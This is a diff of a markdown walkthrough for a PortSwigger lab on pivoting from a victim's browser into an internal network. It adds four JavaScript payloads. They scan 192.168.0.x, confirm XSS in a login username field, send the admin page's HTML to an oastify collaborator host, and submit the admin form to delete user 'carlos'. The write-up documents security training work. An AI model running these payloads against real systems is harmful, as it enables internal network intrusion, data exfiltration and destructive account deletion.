@@ -169,7 +169,7 @@ This lab requires multiple steps to complete. To solve the lab, craft some JavaS
 
         <html>
           <script>
-        collaboratorURL = 'http://d4i329wl1e1wjgh7cec94oo51w7mvb.burpcollaborator.net'
+        collaboratorURL = 'http://g4lmjggpcsdb9x13ip0w6kk70y6pufi4.oastify.com'
 
         for (let i=0; i<256; i++){
             fetch('http://192.168.0.' + i + ':8080')
@@ -189,8 +189,83 @@ This lab requires multiple steps to complete. To solve the lab, craft some JavaS
 * Click Store and click `Deliver exploit to victim`.
 * We can see the output at burp collaborator
 
-![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/083c84f1-cd5d-4569-874b-07bd3710d119)
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/302cfee1-baed-4ce7-8dda-c7b755cb12e5)
 
-* We got the IP as `192.168.0.161`.
+* We got the IP as `192.168.0.22`.
 * Enter below second payload to check the probing of username field for an XSS vulnerability
-* 
+
+      <html>
+          <script>
+        collaboratorURL = 'http://g4lmjggpcsdb9x13ip0w6kk70y6pufi4.oastify.com'
+        url = 'http://192.168.0.22:8080'
+
+        fetch(url)
+        .then(response => response.text())
+        .then(text =>{
+            try {
+                xss_vector = '"><img src='+collaboratorURL+'?foundXSS=1>';
+                login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
+                location = url + login_path;
+
+            } catch(err){
+
+            }
+        });
+          </script>
+      </html>
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/6a0b2a24-28a0-4f2a-b841-ed75d3d350b3)
+
+* Deliver to the victim.
+* Above image we can see that the username is vulnerable to the XSS.
+* Give the below third payload to get the source code of `admin` page.
+
+            <html>
+          <script>
+        collaboratorURL = 'http://g4lmjggpcsdb9x13ip0w6kk70y6pufi4.oastify.com'
+        url = 'http://192.168.0.22:8080'
+
+        fetch(url)
+        .then(response => response.text())
+        .then(text =>{
+            try {
+                xss_vector = '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">';
+                login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
+                location = url + login_path;
+
+            } catch(err){
+
+            }
+        });
+          </script>
+      </html>
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/cd122caa-4479-4494-b139-449db93a950f)
+
+* Select the code and decode it at `Decoder`
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8734d6f4-532c-48f4-9c9d-ab544b26bd47)
+
+* Now give the fourth and last payload to delete the `carlos` user.
+
+        <html>
+          <script>
+        collaboratorURL = 'http://g4lmjggpcsdb9x13ip0w6kk70y6pufi4.oastify.com'
+        url = 'http://192.168.0.22:8080'
+
+        fetch(url)
+        .then(response => response.text())
+        .then(text =>{
+            try {
+                xss_vector = '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0]; if(f.username)f.username.value=\'carlos\',f.submit()">';
+                login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
+                location = url + login_path;
+
+            } catch(err){
+
+            }
+        });
+          </script>
+      </html>
+
+* `carlos` user got deleted and lab is solved.
